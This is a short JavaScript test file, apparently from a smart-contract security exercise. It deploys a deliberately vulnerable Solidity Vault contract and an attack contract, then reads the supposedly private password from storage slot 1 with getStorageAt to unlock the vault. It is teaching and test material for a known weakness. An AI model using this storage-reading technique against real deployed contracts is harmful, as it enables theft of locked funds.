// test/Vault.test.js

// load dependencies
const { expect } = require('chai');

// import utils from test helpers
const { BN, expectEvent, expectRevert } = require('@openzeppelin/test-helpers');

// load compiled artifacts
const Vault = artifacts.require('Vault');
const VaultAttack = artifacts.require('VaultAttack');

// start test block
contract('Vault', function ([ owner, other ]) {

  beforeEach(async function () {
    const pwd = ethers.utils.formatBytes32String('password');
    this.vulnContract   = await Vault.new(pwd, { from: owner });
    this.attackContract = await VaultAttack.new(this.vulnContract.address, {from: other});
    // check initial contract is locked
    expect(await this.vulnContract.locked()).to.be.true;
  });

  it('test attack: use ethers-js to read password from storage slot to unlock vault', async function () {
    const extractedPass = await ethers.provider.getStorageAt(this.vulnContract.address, 1);
    await this.attackContract.attack(extractedPass, {from: other});
    // check contract is now unlocked
    expect(await this.vulnContract.locked()).to.be.false;
  });
});
